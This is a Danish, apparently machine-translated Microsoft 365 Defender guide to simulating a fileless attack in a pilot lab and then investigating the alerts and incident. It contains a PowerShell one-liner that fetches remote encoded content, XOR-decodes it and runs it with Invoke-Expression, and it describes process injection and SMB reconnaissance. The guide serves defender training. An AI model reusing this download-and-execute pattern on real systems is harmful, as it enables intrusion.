---
title: Kør en angrebssimulering i Microsoft 365 Defender pilotmiljø
description: Kør angrebssimulering for Microsoft 365 Defender for at se, hvordan beskeder og hændelser præsenteres, der opnås indsigt, og trusler afhjælpes hurtigt.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 5e1b841c5638bf9228efc844daa58d1d1e170726
ms.sourcegitcommit: d32654bdfaf08de45715dd362a7d42199bdc1ee7
ms.translationtype: MT
ms.contentlocale: da-DK
ms.lasthandoff: 03/23/2022
ms.locfileid: "63754747"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Kør en angrebssimulering i Microsoft 365 Defender pilotmiljø


Denne artikel er [trin 1 af 2](eval-defender-investigate-respond.md) i gang med at udføre en undersøgelse af og svar på en hændelse i Microsoft 365 Defender et pilotmiljø. Du kan finde flere oplysninger om denne proces i [oversigtsartikel](eval-defender-investigate-respond.md) .

Når du har forberedt dit [pilotmiljø](eval-defender-investigate-respond.md), er det tid til at teste Microsoft 365 Defender's hændelsesrespons og automatiserede undersøgelses- og afhjælpningsfunktioner ved at oprette en hændelse med en simuleret angreb og bruge Microsoft 365 Defender-portalen til at undersøge og reagere.

En hændelse i Microsoft 365 Defender er en samling af korrelerede beskeder og tilknyttede data, der udgør historien om et angreb.

Microsoft 365 og apps opretter beskeder, når de registrerer en mistænkelig eller skadelig hændelse eller aktivitet. Individuelle beskeder giver værdifulde fingerpeg om et fuldført eller igangværende angreb. Men angreb anvender typisk forskellige teknikker mod forskellige typer enheder, f.eks enheder, brugere og postkasser. Resultatet er flere beskeder for flere enheder i din lejer.

>[!Note]
>Hvis du er helt ny bruger af sikkerhedsanalyse og hændelsesrespons, [](first-incident-overview.md) kan du se gennemgangen Svar på din første hændelse for at få en rundvisning i en typisk analyseproces, afhjælpning og gennemgang efter hændelsen.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Simulere angreb med Microsoft 365 Defender portal

Portalen Microsoft 365 Defender indeholder indbyggede funktioner til at oprette simulerede angreb på dit pilotmiljø:

- Kursus i angrebssimulering Microsoft 365 Defender til Office 365 på [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).
  
  I portalen Microsoft 365 Defender skal du vælge Mail **& og > kursus i simulering af angreb**.

- Selvstudier til & for Microsoft 365 Defender til slutpunkt på [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  På portalen <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender skal</a> du vælge **Slutpunkter > selvstudier & simuleringerne**.

### <a name="defender-for-office-365-attack-simulation-training"></a>Defender til Office 365-angrebssimulering

Defender til Office 365 med Microsoft 365 E5 eller Microsoft Defender til Office 365 Plan 2 omfatter oplæring af angrebssimulering af phishingangreb. De grundlæggende trin er:

1. Opret en simulering

   Du kan finde en trinvis vejledning i at oprette og starte en ny simulering under [Simulere et phishingangreb](/microsoft-365/security/office-365-security/attack-simulation-training).

2. Opret en nyttedata

   For at få en trinvis vejledning i, hvordan du opretter en nyttelast til brug i en simulering, skal du se Opret en brugerdefineret [nyttelast til simulering af angreb](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. Få indsigt

   For at få en trinvis vejledning i, hvordan du får indsigt i rapportering, skal du se [Få indsigt gennem simulering af angreb](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

Du kan finde flere oplysninger under [Simulering.](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Defender til endpoint-angrebs tutorials & simulering

Her er defender for slutpunktssimuleringerne fra Microsoft:

- Dokument falder i backdoor
- Automatiseret undersøgelse (backdoor)

Der er flere simuleringer fra tredjepartskilder. Der er også et sæt selvstudier.

For hver simulering eller selvstudium:

1. Download og læs det tilhørende gennemgangsdokument.

2. Download simuleringsfilen. Du kan vælge at downloade filen eller scriptet på testenheden, men det er ikke obligatorisk.

3. Kør simuleringsfilen eller scriptet på testenheden som anvist i gennemgangsdokumentet.

 Få mere at vide under [Oplev Microsoft Defender til slutpunkt gennem simulerede angreb](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Simulere et angreb med en isoleret domænecontroller og klientenhed (valgfrit)

I denne valgfri øvelse med hændelsesrespons kan du simulere et angreb på en isoleret Active Directory-domæneservices-domænecontroller (AD DS) og Windows-enhed ved hjælp af et PowerShell-script og derefter undersøge, afhjælpe og løse hændelsen.

Først skal du føje slutpunkter til dit pilotmiljø.

### <a name="add-pilot-environment-endpoints"></a>Tilføj slutpunkter for pilotmiljø

Først skal du føje en isoleret AD DS domænecontroller og en Windows enhed til dit pilotmiljø.

1. Kontrollér, at din pilotmiljølejer [har Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Kontrollér, at domænecontrolleren:

   - Kører Windows Server 2008 R2 eller en nyere version.
   - Rapporterer til [Microsoft Defender for Identity og](/azure/security-center/security-center-wdatp) har aktiveret [fjernadministration](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Har [Microsoft Defender for Identity og Microsoft Defender til integration af skyapps aktiveret](/cloud-app-security/mdi-integration) .
   - Har en testbruger oprettes i testdomænet. Tilladelser på administratorniveau er ikke nødvendige.

3. Kontrollér, at din testenhed:

   - Kører Windows 10 version 1903 eller en nyere version.
   - Er forbundet til domænecontrollerens AD DS domæne.
   - Er [Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) aktiveret. Hvis du har problemer med at aktivere Windows Defender Antivirus, skal du se dette [fejlfindingsemne](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - Er [onboardet til Microsoft Defender til Slutpunkt](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Hvis du bruger lejer- og enhedsgrupper, skal du oprette en dedikeret enhedsgruppe til testenheden og skubbe den til øverste niveau.

Et alternativ er at hoste din AD DS domænecontroller og teste enheden som virtuelle maskiner Microsoft Azure infrastrukturtjenester. Du kan bruge instruktionerne i fase 1 i den simulerede Enterprise [Test Lab-vejledning](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), men springe oprettelsen af den virtuelle APP1-maskine over.

Her er resultatet.

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="Evalueringsmiljøet ved hjælp af den simulerede Enterprise Test Lab-vejledning" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

Du simulerer et avanceret angreb, der udnytter avancerede teknikker til at skjule fra registrering. Angrebene optæller åbne SMB-sessioner (Server Message Block) på domænecontrollere og henter de seneste IP-adresser på brugernes enheder. Denne kategori af angreb omfatter normalt ikke filer, der er tabt på offerets enhed, og de forekommer kun i hukommelsen. De "lever af land" ved hjælp af eksisterende system- og administrationsværktøjer og indsætter deres kode i systemprocesser for at skjule deres udførelse. En sådan funktionsmåde gør det muligt for dem at undgå registrering og bevares på enheden.

I denne simulering starter vores eksempelscenarie med et PowerShell-script. I den virkelige verden kan en bruger blive narret til at køre et script, eller scriptet kan køre fra en fjernforbindelse til en anden computer fra en tidligere inficeret enhed, hvilket indikerer, at hackeren forsøger at bevæge sig side om side i netværket. Registrering af disse scripts kan være svært, fordi administratorer også ofte kører scripts eksternt for at udføre forskellige administrative aktiviteter.

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="Det filløse PowerShell-angreb med procesindtrædelse og SMB-rekognosering af angreb" lightbox="../../media/mtp/mtpdiydiagram.png":::

Under simulering indsætter angrebene shellcode i en tilsyneladende proces, der virker som en proces, der virker som en proces. Scenariet kræver brug af notepad.exe. Vi valgte denne proces til simulering, men hackere vil mere sandsynligt målrette en længere proces i systemet, f.eks. svchost.exe. Shellkoden går derefter videre og kontakter hackerens kommando- og kontrolserver (C2) for at få instruktioner om, hvordan du fortsætter. Scriptet forsøger at udføre rekognoseringsforespørgsler mod domænecontrolleren (DC). Rekognossance gør det muligt for en hacker at få oplysninger om de seneste brugerlogonoplysninger. Når hackere har disse oplysninger, kan de bevæge sig senere i netværket for at få adgang til en bestemt følsom konto

> [!IMPORTANT]
> For optimale resultater skal du følge simuleringsinstruktionerne til angreb så tæt som muligt.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Kør den isolerede AD DS domænecontrollerens angrebssimulering

Sådan kører du simulering af angrebsscenariet:

1. Sørg for, at dit pilotmiljø omfatter den isolerede AD DS domænecontroller og Windows enhed.

2. Log på testenheden med testbrugerkontoen.

3. Åbn Windows PowerShell vindue på testenheden.

4. Kopiér følgende simuleringsscript:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Hvis du åbner denne artikel i en webbrowser, kan der opstå problemer med at kopiere hele teksten uden at miste bestemte tegn eller introducere ekstra linjeskift. Hvis det er tilfældet, kan du downloade dette dokument og åbne det på Adobe Reader.

5. Indsæt og kør det kopierede script i PowerShell-vinduet.

> [!NOTE]
> Hvis du kører PowerShell ved hjælp af REMOTE Desktop Protocol (RDP), skal du bruge kommandoen Skriv udklipsholdertekst i RDP-klienten, fordi genvejstasten **CTRL-V** eller højreklik på indsætning måske ikke fungerer. Nyere versioner af PowerShell accepterer nogle gange heller ikke denne metode. Det kan også være, at du er nødt til at kopiere til Notesblok i hukommelsen først, kopiere den i den virtuelle maskine og derefter indsætte den i PowerShell.

Nogle få sekunder senere Notesblok appen åbne. Der vil blive indsatte simulerede angrebskode Notesblok. Hold den automatisk oprettede forekomst Notesblok åben, så du kan se det fulde scenarie.

Den simulerede angrebskode vil forsøge at kommunikere til en ekstern IP-adresse (si hele C2-serveren) og derefter forsøge at omkonfigurere mod domænecontrolleren via SMB.

Du får vist denne meddelelse på PowerShell-konsollen, når dette script er fuldført:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Hvis du vil se funktionen Automatiseret hændelse og svar i aktion, skal notepad.exe processen åben. Du får vist automatiseret hændelse og svar for at stoppe Notesblok processen.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Undersøg hændelsen for de simulerede angreb

> [!NOTE]
> Før vi hjælper dig gennem denne simulering, skal du se følgende video for at finde ud af, hvordan hændelsesstyring hjælper dig med at samle de relaterede beskeder som en del af undersøgelsesprocessen, hvor du kan finde den på portalen, og hvordan den kan hjælpe dig i dine sikkerhedshandlinger:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Når du skifter til SOC-analytikerens synspunkt, kan du nu begynde at undersøge angrebene Microsoft 365 Defender portalen.

1. Åbn <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender portalen</a>.

2. I **navigationsruden skal du vælge Hændelser & beskeder > hændelser**.

3. Den nye hændelse for de simulerede angreb vises i hændelseskøen.

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="Køen Hændelser i Microsoft 365 Defender-portalen" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>Undersøg angrebene som en enkelt hændelse

Microsoft 365 Defender korrelerer analyser og samler alle relaterede beskeder og undersøgelser fra forskellige produkter til én hændelsesenhed. Ved at gøre dette viser Microsoft 365 Defender en bredere angrebshistorie, så SOC-analytikeren kan forstå og reagere på komplekse trusler.

De beskeder, der genereres under denne simulering, er knyttet til den samme trussel, og derfor sammenlægges de automatisk som en enkelt hændelse.

Sådan får du vist hændelsen:

1. Åbn <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender portalen</a>.

2. I **navigationsruden skal du vælge Hændelser & beskeder > hændelser**.

3. Vælg det nyeste element ved at klikke på cirklen, der er placeret til venstre for navnet på hændelsen. Et sidepanel viser yderligere oplysninger om hændelsen, herunder alle de relaterede beskeder. Hver hændelse har et entydigt navn, der beskriver det baseret på attributterne for de beskeder, den indeholder.

   De beskeder, der vises i dashboardet, kan filtreres baseret på tjenesteressourcer: Microsoft Defender for Identity, Microsoft Defender til skyapps, Microsoft Defender til slutpunkt, Microsoft 365 Defender og Microsoft Defender Office 365.

3. Vælg **Åbn hændelsesside** for at få flere oplysninger om hændelsen.

   På siden **Hændelse** kan du se alle de beskeder og oplysninger, der er relateret til hændelsen. Oplysningerne omfatter de enheder og aktiver, der er involveret i beskeden, registreringskilden til beskederne (f.eks. Microsoft Defender for Identity eller Microsoft Defender til slutpunkt), og årsagen til, at de blev kædet sammen. Når du gennemgår listen over hændelser, kan du se forløbet af angrebene. I denne visning kan du se og undersøge de enkelte beskeder.

   Du kan også klikke **på Administrer** hændelse i højre menu for at mærke hændelsen, tildele den til dig selv og tilføje kommentarer.

#### <a name="review-generated-alerts"></a>Gennemse genererede beskeder

Lad os se på nogle af de beskeder, der genereres under de simulerede angreb.

> [!NOTE]
> Vi gennemgår kun nogle få af de beskeder, der genereres under de simulerede angreb. Afhængigt af versionen af Windows og Microsoft 365 Defender-produkter, der kører på din testenhed, får du muligvis vist flere beskeder, der vises i en lidt anden rækkefølge.

:::image type="content" source="../../media/mtp/fig6.png" alt-text="En genereret besked i Microsoft 365 Defender portal" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Advarsel: Mistænkelig indførsel af proces, som er blevet observeret (kilde: Microsoft Defender til slutpunkt)

Avancerede hackere bruger avancerede og avancerede metoder til at bevare deres hukommelse og skjule dem fra registreringsværktøjer. En almindelig metode er at arbejde inde fra en pålidelig systemproces i stedet for en skadelig eksekverbar fil, hvilket gør det svært for registreringsværktøjer og sikkerhedshandlinger at opdage den skadelige kode.

For at give SOC-analytikere mulighed for at opfange disse avancerede angreb, giver de dybe hukommelsessensorer i Microsoft Defender til Slutpunkt vores skytjeneste, hvor de kan se de forskellige teknikker til indløsning af kode på tværs af processer. Følgende figur viser, hvordan Defender til slutpunktet har registreret og advaret ved forsøget på at indsætte kode <i>notepad.exe</i>.

:::image type="content" source="../../media/mtp/fig7.png" alt-text="En besked om indførslen af potentielt skadelig kode i Microsoft 365 Defender portal" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Advarsel: Uventet funktionsmåde, der observeres af en proces, der kører uden kommandolinjeargumenter (kilde: Microsoft Defender til slutpunkt)

Registreringer af Microsoft Defender til slutpunkter målretter ofte den mest almindelige attribut for en angrebsteknik. Denne metode sikrer, at hackere kan skifte til nyere taktikker, og hæver linjen.

Vi anvender læringsalgoritmer i stor skala til at etablere den normale funktionsmåde for almindelige processer i en organisation og i hele verden og holder øje med, når disse processer viser unormal adfærd. Disse unormale funktionsmåder indikerer ofte, at overflødig kode blev introduceret og kører i en ellers pålidelig proces.

I dette scenarie udviser <i>notepad.exe</i> unormal adfærd, der involverer kommunikation med en ekstern placering. Dette resultat er uafhængigt af den specifikke metode, der bruges til at introducere og udføre den skadelige kode.

> [!NOTE]
> Da denne besked er baseret på maskinlæringsmodeller, der kræver yderligere backendbehandling, kan det tage lidt tid, før du får vist denne besked på portalen.

Bemærk, at advarselsoplysningerne omfatter den eksterne IP-adresse – en indikator, som du kan bruge som en pivot til at udvide undersøgelsen.

Vælg IP-adressen i beskedprocestræet for at få vist siden med oplysninger om IP-adressen.

:::image type="content" source="../../media/mtp/fig8.png" alt-text="En besked om uventet funktionsmåde i en proces, der kører uden kommandolinjeargumenter i Microsoft 365 Defender portal" lightbox="../../media/mtp/fig8.png":::

I følgende figur vises den valgte side med oplysninger om IP-adresse (når du klikker på IP-adressen i træet Beskedproces).

:::image type="content" source="../../media/mtp/fig9.png" alt-text="Siden med oplysninger om IP-adressen i Microsoft 365 Defender portalen" lightbox="../../media/mtp/fig9.png":::


##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Besked: Bruger- og IP-adresserekognosering (SMB) (kilde: Microsoft Defender til identitet)

Optælling ved hjælp af SMB-protokollen (Server Message Block) gør det muligt for hackere at få de seneste logonoplysninger, der hjælper dem med at bevæge sig senere gennem netværket for at få adgang til en bestemt følsom konto.

Under denne registrering udløses der en besked, når SMB-sessionens optælling kører mod en domænecontroller.

:::image type="content" source="../../media/mtp/fig10.png" alt-text="Microsoft Defender for Identity-påmindelse for genkonfiguration af bruger- og IP-adresse i Microsoft 365 Defender-portalen" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Gennemse enhedens tidslinje med Microsoft Defender til slutpunkt

Når du har udforsket de forskellige beskeder i denne hændelse, skal du gå tilbage til den hændelsesside, du undersøgte tidligere. Vælg fanen **Enheder** på hændelsessiden for at gennemgå de enheder, der er involveret i denne hændelse, som rapporteret af Microsoft Defender til Slutpunkt og Microsoft Defender for Identity.

Vælg navnet på den enhed, hvor angrebene blev udført, for at åbne enhedssiden for den pågældende enhed. På denne side kan du se beskeder, der blev udløst, og relaterede hændelser.

Vælg fanen **Tidslinje** for at åbne enhedens tidslinje og få vist alle hændelser og funktionsmåder, der er observeret på enheden i kronologisk rækkefølge, der er indbyrdes for beskederne hævet.

:::image type="content" source="../../media/mtp/fig11.png" alt-text="Sektionen Tidslinje for enhed i Microsoft 365 Defender portal" lightbox="../../media/mtp/fig11.png":::

Ved at udvide nogle af de mere interessante funktionsmåder får du nyttige oplysninger, f.eks. procestræer.

Rul f.eks. ned, indtil du finder hændelsen Mistænkelig indhændelse **observeret**. Vælg den **powershell.exe, der notepad.exe** en proceshændelse under sig, for at få vist hele procestræet til denne funktionsmåde under grafen Hændelsesenheder  i sideruden. Brug søgelinjen til filtrering, hvis det er nødvendigt.

:::image type="content" source="../../media/mtp/fig12.png" alt-text="En valgt PowerShell-funktionsmåde for oprettelse af filers procestræ i Microsoft 365 Defender-portalen" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Gennemse brugeroplysningerne med Microsoft Defender til skyapps

På hændelsessiden skal du vælge fanen **Brugere** for at få vist listen over brugere, der er involveret i angrebene. Tabellen indeholder yderligere oplysninger om hver bruger, herunder hver brugers vurdering af **undersøgelsesprioritet** .

Vælg brugernavnet for at åbne brugerens profilside, hvor yderligere undersøgelse kan udføres. [Læs mere om undersøgelse af risikabelt bruger](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="../../media/mtp/fig13.png" alt-text="Brugersiden for Defender til skyapps i Microsoft 365 Defender-portalen" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>Automatiseret undersøgelse og afhjælpning

> [!NOTE]
>Før vi hjælper dig gennem denne simulering, skal du se følgende video for at få kendskab til, hvad automatiseret selvbetjening er, hvor du kan finde den på portalen, og hvordan den kan hjælpe dig i dine sikkerhedshandlinger:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Gå tilbage til hændelsen i Microsoft 365 Defender-portalen. Fanen **Undersøgelser på** **siden Hændelse viser** de automatiserede undersøgelser, der blev udløst af Microsoft Defender for Identity og Microsoft Defender til Slutpunkt. Skærmbilledet nedenfor viser kun den automatiske undersøgelse, der udløses af Defender til Slutpunkt. Som standard afhjælper Defender til slutpunkt automatisk de artefakter, der findes i køen, hvilket kræver afhjælpning.

:::image type="content" source="../../media/mtp/fig14.png" alt-text="Det afsnit af automatiserede undersøgelser, der er relateret til hændelsen Microsoft 365 Defender portalen" lightbox="../../media/mtp/fig14.png":::

Vælg den besked, der udløste en undersøgelse, for at åbne **siden Undersøgelsesoplysninger** . Du får vist følgende detaljer:

- Beskeder, der udløste den automatiske undersøgelse.
- På påvirkede brugere og enheder. Hvis der findes indikatorer på flere enheder, vises disse yderligere enheder også.
- Liste over beviser. De enheder, der er fundet og analyseret, f.eks. filer, processer, tjenester, drivere og netværksadresser. Disse enheder analyseres for mulige relationer til beskeden og klassificeres som bengalske eller skadelige.
- Der blev fundet trusler. Kendte trusler, der blev fundet under undersøgelsen.

> [!NOTE]
> Afhængigt af tidsindstillingen kører den automatiske undersøgelse muligvis stadig. Vent et par minutter, indtil processen er fuldført, før du indsamler og analyserer beviserne og gennemgår resultaterne. Opdater siden **med undersøgelsesoplysninger** for at få de nyeste resultater.

:::image type="content" source="../../media/mtp/fig15.png" alt-text="Siden Undersøgelsesoplysninger i Microsoft 365 Defender portalen" lightbox="../../media/mtp/fig15.png":::

Under den automatiserede undersøgelse identificerede Microsoft Defender for Endpoint notepad.exe processen, der blev tilføjet som en af de artefakter, der kræver afhjælpning. Defender til Slutpunkt stopper automatisk den mistænkelige procesindsætning som en del af den automatiske afhjælpning.

Du kan se <i>notepad.exe</i> forsvinder fra listen over kørende processer på testenheden.

#### <a name="resolve-the-incident"></a>Løs hændelsen

Når undersøgelsen er afsluttet og bekræftet for at blive løst, løser du hændelsen.

Vælg Administrer **hændelse** på **siden Hændelse**. Angiv status til Løs **hændelse, og** vælg **True alert** for the classification and **Security testing** for the determination.

:::image type="content" source="../../media/mtp/fig16.png" alt-text="Panelet Administrer hændelser med mulighed for at løse hændelser i Microsoft 365 Defender-portalen" lightbox="../../media/mtp/fig16.png":::

Når hændelsen er løst, løses alle de tilknyttede beskeder i Microsoft 365 Defender og de relaterede portaler.

Dette ombryder angrebssimulering til hændelsesanalyse, automatiseret undersøgelse og hændelsesløsning.

## <a name="next-step"></a>Næste trin

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="De Microsoft 365 Defender egenskaber for hændelsesrespons" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

Trin 2 af 2: [Prøv Microsoft 365 Defender egenskaber for hændelsesrespons](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>Navigation, du skal muligvis bruge

[Oprette Microsoft 365 Defender Evalueringsmiljø](eval-create-eval-environment.md)
